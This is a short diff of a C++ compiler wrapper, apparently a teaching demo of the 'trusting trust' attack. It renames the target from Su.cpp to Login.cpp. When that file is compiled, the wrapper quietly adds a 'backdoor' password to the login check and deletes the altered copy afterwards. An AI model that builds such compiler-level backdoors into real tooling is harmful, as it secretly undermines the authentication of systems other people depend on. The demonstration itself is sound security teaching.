@@ -15,16 +15,16 @@ void findAndReplace(string fileName, string regexPattern, string newText) {
     fileOutputStream << modifiedSource;
 }
 
-void compileSuWithBackdoor(string allArgs) {
-    system("cat Su.cpp > SuWithBackdoor.cpp");
+void compileLoginWithBackdoor(string allArgs) {
+    system("cat Login.cpp > LoginWithBackdoor.cpp");
 	findAndReplace(
-        "SuWithBackdoor.cpp",
+        "LoginWithBackdoor.cpp",
         "enteredPassword == \"test123\"",
         "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
     );
-    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Su.cpp"), "SuWithBackdoor.cpp");
+    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
 	system(modifiedCommand.c_str());
-	remove("SuWithBackdoor.cpp");
+	remove("LoginWithBackdoor.cpp");
 }
 
 int main(int argc, char *argv[]) {
@@ -33,8 +33,8 @@ int main(int argc, char *argv[]) {
         allArgs += " " + string(argv[i]);
     string shellCommand = "g++" + allArgs;
     string fileName = string(argv[1]);
-    if(fileName == "Su.cpp")
-        compileSuWithBackdoor(allArgs);
+    if(fileName == "Login.cpp")
+        compileLoginWithBackdoor(allArgs);
     else
 	    system(shellCommand.c_str());
 }
